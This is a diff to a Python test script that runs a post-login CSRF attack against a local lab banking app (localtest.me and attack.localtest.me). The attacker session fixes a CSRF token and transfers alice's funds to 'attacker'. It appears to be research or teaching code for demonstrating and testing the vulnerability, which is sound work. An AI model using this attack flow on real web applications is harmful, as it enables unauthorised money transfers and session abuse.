@@ -1,18 +1,15 @@
 import requests, random
 from bs4 import BeautifulSoup
+import os
 
 
-TARGET = 'http://localtest.me/'
-ATTACKER = 'http://attack.localtest.me/'
+try:
+    PROTOCOL = os.environ['PROTOCOL']
+except:
+    PROTOCOL = 'http'
+TARGET = f'{PROTOCOL}://localtest.me/'
+ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
 PRIVATE_KEY = './server/localtest.me.crt'
-
-# var balance = { 
-#        user: 1000,
-#        alice: 1000,
-#        bob: 1000,
-#        john_doe: 1000,
-#        attacker: 1000 
-#      };
 
 
 USER1 = 'alice'
@@ -73,7 +70,7 @@ with requests.Session() as s:
     print("[+] Testing login")
 
     ### Access main page
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET, verify = PRIVATE_KEY)
     assert LOGOUT_MESSAGE in r.text
 
     ### Fail to perform CSRF protected operation
@@ -89,10 +86,10 @@ with requests.Session() as s:
     csrf_token = get_csrf_token(r.text)
 
     r = transfer_express('attacker', ammount1, csrf_token)
-    assert f"Successfull transferred {ammount1} from {USER1} to attacker" in r.text
+    assert f"Successfully transferred {ammount1} from {USER1} to attacker" in r.text
     current_balance -= ammount1
 
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET)
     assert f'Welcome {USER1}.' in r.text
     assert str(current_balance) in r.text
 
@@ -105,7 +102,7 @@ with requests.Session() as s:
 with requests.Session() as s:
     print("[+] Trying post-login without fixation")
 
-    r_target = s.get(TARGET, verify = False)
+    r_target = s.get(TARGET, verify = PRIVATE_KEY)
     assert LOGOUT_MESSAGE in r_target.text
 
     ### TARGET LOGIN
@@ -114,7 +111,7 @@ with requests.Session() as s:
 
     ### ATTACKER tries performing CSRF protected operation on behalf uf USER1 WITHOUT post-fixating the secret
     ### Attacker (wrongly) Setting post-Session
-    r_attacker = s.get(ATTACKER, verify = False)
+    r_attacker = s.get(ATTACKER, verify = PRIVATE_KEY)
     ### extract csrf token to use later
     csrf_token_attacker = get_csrf_token(r_attacker.text)
 
@@ -132,7 +129,7 @@ print("[+] Sanity Checks passed")
 with requests.Session() as s:
     print("[+] Testing post-login CSRF attack")
 
-    r_target = s.get(TARGET, verify = False)
+    r_target = s.get(TARGET, verify = PRIVATE_KEY)
     assert LOGOUT_MESSAGE in r_target.text
 
     ### TARGET LOGIN
@@ -140,7 +137,7 @@ with requests.Session() as s:
     assert current_balance == get_balance(r_target.text)
     
     ### Attacker Setting post-Session
-    s.get(ATTACKER, verify = False)
+    s.get(ATTACKER, verify = PRIVATE_KEY)
     ## params will be discarded if not in user mode
     r_attacker = s.get(ATTACKER + 'set_post_session', params = {'username' : USER1})
     ### extract csrf token to use later
@@ -148,10 +145,10 @@ with requests.Session() as s:
 
     ### ATTACKER Succeeds in performing CSRF protected operation on behalf uf USER1
     r_attacker = transfer_express('attacker', ammount2, csrf_token_attacker)
-    assert f"Successfull transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to post-login CSRF attack"
+    assert f"Successfully transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to post-login CSRF attack"
     current_balance -= ammount2
 
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET)
     assert f'Welcome {USER1}.' in r.text
     assert str(current_balance) in r.text
 
